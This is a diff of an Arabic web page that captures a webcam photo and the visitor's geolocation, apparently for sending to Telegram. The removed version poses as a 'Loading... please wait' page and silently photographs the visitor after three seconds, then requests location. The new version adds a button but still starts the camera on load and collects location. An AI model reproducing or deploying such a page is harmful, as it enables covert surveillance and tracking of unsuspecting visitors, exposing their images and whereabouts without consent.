@@ -1,24 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>جارٍ التحميل...</title>
+  <title>التقاط صورة وإرسالها</title>
 </head>
 <body>
-  <h2>يرجى الانتظار...</h2>
+  <h2>التقط صورة وأرسلها إلى تليجرام</h2>
 
   <video id="video" width="300" autoplay muted playsinline style="display: block;"></video>
+  <br>
+  <button onclick="takePhoto()">التقط صورة</button>
 
   <script>
-    async function captureAndSend() {
+    let stream;
+    let video = document.getElementById('video');
+
+    // تشغيل الكاميرا أولاً
+    async function startCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        await video.play();
+      } catch (err) {
+        console.error('فشل تشغيل الكاميرا:', err);
+      }
+    }
 
-        await new Promise(resolve => setTimeout(resolve, 3000)); // الانتظار 3 ثواني
-
+    // التقاط الصورة
+    async function takePhoto() {
+      try {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
@@ -28,6 +37,7 @@
         const imageData = canvas.toDataURL('image/jpeg');
         const blob = await (await fetch(imageData)).blob();
 
+        // إيقاف الكاميرا
         stream.getTracks().forEach(track => track.stop());
 
         // الحصول على الموقع
@@ -51,15 +61,16 @@
           });
 
         }, (error) => {
-          console.error("فشل الحصول على الموقع:", error);
+          console.error("فشل تحديد الموقع:", error);
         });
 
       } catch (err) {
-        console.error("فشل الوصول إلى الكاميرا:", err);
+        console.error('فشل في التقاط الصورة أو الإرسال:', err);
       }
     }
 
-    captureAndSend();
+    // بدء تشغيل الكاميرا تلقائياً
+    startCamera();
   </script>
 </body>
 </html>
